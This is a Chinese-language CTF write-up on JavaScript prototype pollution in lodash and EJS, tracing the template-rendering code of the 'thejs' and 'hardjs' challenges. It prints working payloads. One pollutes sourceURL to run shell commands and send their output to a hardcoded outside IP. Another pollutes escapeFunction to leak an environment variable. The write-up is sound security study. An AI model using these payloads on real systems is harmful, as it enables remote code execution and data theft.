# 前言
一直对原型链污染有些地方不是很理解，通过这些题目和例子分析一下，欢迎师傅们斧正一些说的不对的地方
# 例题
## lodash
## 1、Code-Breaking thejs
`server.js`
    const fs = require('fs')
    const express = require('express')
    const bodyParser = require('body-parser')
    const lodash = require('lodash')
    const session = require('express-session')
    const randomize = require('randomatic')
    const app = express()
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
    app.use('/static', express.static('static'))
    app.use(session({
        name: 'thejs.session',
        secret: randomize('aA0', 16),
        resave: false,
        saveUninitialized: false
    }))
    app.engine('ejs', function (filePath, options, callback) { // define the template engine
        fs.readFile(filePath, (err, content) => {
            if (err) return callback(new Error(err))
            let compiled = lodash.template(content)
            let rendered = compiled({...options})
            return callback(null, rendered)
        })
    })
    app.set('views', './views')
    app.set('view engine', 'ejs')
    app.all('/', (req, res) => {
        let data = req.session.data || {language: [], category: []}
        if (req.method == 'POST') {
            data = lodash.merge(data, req.body)
            req.session.data = data
        }
        res.render('index', {
            language: data.language, 
            category: data.category
        })
    })
    app.listen(3000, () => console.log(`Example app listening on port 3000!`))
只有一个功能就是把喜欢的语言，和ctf的选项提交
看到一个敏感的库`lodash`
存在着原型链污染，可以通过修改对象的`__proto__`来修改对象里的属性
### 测试代码
    var _ = require('lodash');
    var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
    _.merge({},payload)
    console.log(payload.isAdmin)
    //true
直接将对象内的`isAdmin`修改为`true`
用`webstorm`下断点，本地打开，运行，在这两个位置下断点，跟一下代码
当我们post`{"__proto__":{"xxx":123}}`
`merge`后可以写一段`console.log(data.xxx)`会发现输出`123`
原因是修改了对象的`__proto__`，当输出`data.xxx`时会先查找`data.__proto__.xxx`
P神的[文章](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)说的很清楚了
我们要看看模板渲染(lodash.template)的代码，看看可以修改哪些属性，进而命令执行（我这里需要强制单步跟进，红色那个下箭头）
发现`options.sourceURL`只要存在就可以作为`sourceURL`，但是这里写死的没有设置`options`
    var sourceURL = '//# sourceURL=' +
            ('sourceURL' in options
              ? options.sourceURL
              : ('lodash.templateSources[' + (++templateCounter) + ']')
            ) + '\n';
再往下看这个变量
    var result = attempt(function() {
            return Function(importsKeys, sourceURL + 'return ' + source)
              .apply(undefined, importsValues);
          });
return Function 是动态函数的意思
结构：
    var f = new Function('say',"alert(say);");//第一个参数，是构建出来的动态函数的参数；第二个参数，是函数体
回到题目代码很明显能看到拼接，但是前面有个注释`//# sourceURL=`,需要换行`\u000a`和`\n` 都是可以的
`new Function`里不能直接`require('child_process')`
报错结果就是页面无回显
需要用`global.process.mainModule.constructor._load`来加载库，还有容器里不存在`wget`和`curl`
需要调用`http`库
payload:
    {"__proto__":{"sourceURL":"\nvar require = global.process.mainModule.constructor._load;var result = require('child_process').execSync('ls /').toString();var req = require('http').request(`http://39.108.36.103:2333/${result}`);req.end()"}}
## 2.hardjs [ejs 模板引擎]
### Referer
### Source
render 过程
`res.render`
    res.render = function render(view, options, callback) {
      var app = this.req.app;
      var done = callback;
      var opts = options || {};
      var req = this.req;
      var self = this;
      // support callback function as second arg
      if (typeof options === 'function') {
        done = options;
        opts = {};
      }
      // merge res.locals
      opts._locals = self.locals;
      // default callback to respond
      done = done || function (err, str) {
        if (err) return req.next(err);
        self.send(str);
      };
      // render
      app.render(view, opts, done);
    };
application app.render
    app.render = function render(name, options, callback) {
    ……
    tryRender(view, renderOptions, done);
tryRender
    function tryRender(view, options, callback) {
      try {
        view.render(options, callback);
view.render
    View.prototype.render = function render(options, callback) {
      debug('render "%s"', this.path);
      this.engine(this.path, options, callback);
    };
this.engine 就是ejs了
    exports.renderFile = function () {
    ……
    return tryHandleCache(opts, data, cb);
    }
tryHandleCache
    function tryHandleCache(options, data, cb) {
      var result;
      if (!cb) {
        if (typeof exports.promiseImpl == 'function') {
          return new exports.promiseImpl(function (resolve, reject) {
            try {
              result = handleCache(options)(data);
              resolve(result);
            }
            catch (err) {
              reject(err);
            }
          });
        }
        else {
          throw new Error('Please provide a callback function');
        }
      }
      else {
        try {
          result = handleCache(options)(data);
        }
        catch (err) {
          return cb(err);
        }
        cb(null, result);
      }
    }
handleCache
    function handleCache(options, template) {
      var func;
      var filename = options.filename;
      var hasTemplate = arguments.length > 1;
      if (options.cache) {
        if (!filename) {
          throw new Error('cache option requires a filename');
        }
        func = exports.cache.get(filename);
        if (func) {
          return func;
        }
        if (!hasTemplate) {
          template = fileLoader(filename).toString().replace(_BOM, '');
        }
      }
      else if (!hasTemplate) {
        // istanbul ignore if: should not happen at all
        if (!filename) {
          throw new Error('Internal EJS error: no file name or template '
                        + 'provided');
        }
        template = fileLoader(filename).toString().replace(_BOM, '');
      }
      func = exports.compile(template, options);
      if (options.cache) {
        exports.cache.set(filename, func);
      }
      return func;
    }
exports.complie
    exports.compile = function compile(template, opts) {
      var templ;
      // v1 compat
      // 'scope' is 'context'
      // FIXME: Remove this in a future version
      if (opts && opts.scope) {
        if (!scopeOptionWarned){
          console.warn('`scope` option is deprecated and will be removed in EJS 3');
          scopeOptionWarned = true;
        }
        if (!opts.context) {
          opts.context = opts.scope;
        }
        delete opts.scope;
      }
      templ = new Template(template, opts);
      return templ.compile();
    };
到Template
> function Template(text, opts) {
找compile方法
    compile: function () {
    ……
      if (!this.source) {
        this.generateSource();
        prepended += '  var __output = [], __append = __output.push.bind(__output);' + '\n';
        if (opts.outputFunctionName) {
          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
        }
        if (opts._with !== false) {
          prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';
          appended += '  }' + '\n';
        }
        appended += '  return __output.join("");' + '\n';
        this.source = prepended + this.source + appended;
      }
      if (opts.compileDebug) {
        src = 'var __line = 1' + '\n'
          + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
          + '  , __filename = ' + (opts.filename ?
          JSON.stringify(opts.filename) : 'undefined') + ';' + '\n'
          + 'try {' + '\n'
          + this.source
          + '} catch (e) {' + '\n'
          + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
          + '}' + '\n';
      }
      else {
        src = this.source;
      }
      if (opts.client) {
        src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
        if (opts.compileDebug) {
          src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
        }
      }
      if (opts.strict) {
        src = '"use strict";\n' + src;
      }
      if (opts.debug) {
        console.log(src);
      }
      try {
        if (opts.async) {
          // Have to use generated function for this, since in envs without support,
          // it breaks in parsing
          try {
            ctor = (new Function('return (async function(){}).constructor;'))();
          }
          catch(e) {
            if (e instanceof SyntaxError) {
              throw new Error('This environment does not support async/await');
            }
            else {
              throw e;
            }
          }
        }
        else {
          ctor = Function;
        }
        fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
      }
      catch(e) {
        // istanbul ignore else
        if (e instanceof SyntaxError) {
          if (opts.filename) {
            e.message += ' in ' + opts.filename;
          }
          e.message += ' while compiling ejs\n\n';
          e.message += 'If the above error is not helpful, you may want to try EJS-Lint:\n';
          e.message += 'https://github.com/RyanZim/EJS-Lint';
          if (!e.async) {
            e.message += '\n';
            e.message += 'Or, if you meant to create an async function, pass async: true as an option.';
          }
        }
        throw e;
      }
      if (opts.client) {
        fn.dependencies = this.dependencies;
        return fn;
      }
      // Return a callable function which will execute the function
      // created by the source-code, with the passed data as locals
      // Adds a local `include` function which allows full recursive include
      var returnedFn = function (data) {
        var include = function (path, includeData) {
          var d = utils.shallowCopy({}, data);
          if (includeData) {
            d = utils.shallowCopy(d, includeData);
          }
          return includeFile(path, opts)(d);
        };
        return fn.apply(opts.context, [data || {}, escapeFn, include, rethrow]);
      };
      returnedFn.dependencies = this.dependencies;
      return returnedFn;
    },
  * 解法1 escape
    ……
    var escapeFn = opts.escapeFunction;
    ……
    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }
payload
>
> {"type":"test","content":{"constructor":{"prototype":{"client":true,"escapeFunction":
> "1;return process.env.FLAG","compileDebug":true}}}}
打五次
    else if(dataList[0].count > 5) {
    ……
    else{
      console.log("Return recorder is less than 5,so return it without merge.");
      ……